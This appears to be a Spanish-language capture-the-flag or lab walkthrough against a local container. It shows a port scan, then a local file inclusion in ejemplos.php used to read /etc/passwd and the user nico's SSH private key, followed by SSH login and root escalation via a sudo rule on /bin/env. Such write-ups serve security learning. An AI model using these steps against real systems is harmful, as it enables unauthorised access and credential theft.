PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Entramos a la web, vemos dos botones. Le damos al que pone ejemplos y nos sale la siguiente URL:
	-http://pn/ejemplos.php?images=./ejemplo1

-Tiene pinta de un posible LFI (Local File Inclusion). Vamos a comprobarlo:
	-http://pn/ejemplos.php?images=/etc/passwd
	-Nos muestra el /etc/passwd

-En el fichero '/etc/passwd' hemos visto el usuario nico, vamos a buscar su clave privada de ssh en el su directorio de trabajo:
	-http://pn/ejemplos.php?images=/home/nico/.ssh/id_rsa
	-Hemos encontrado su clave privada!!

-La guardamos y le damos los permisos necesarios:
	-chmod 0400 id_rsa

-Nos autenticamos por ssh con la clave privada de nico:
	-ssh -i id_rsa nico@172.17.0.2
	nico@03e3244eb97c:~$


## Escalada de Privilegios

-sudo -l:
	(ALL) NOPASSWD: /bin/env

-Abusamos de /bin/env:
	-nico@03e3244eb97c:~$ sudo env /bin/sh
		root@03e3244eb97c:/home/nico# whoami
		root



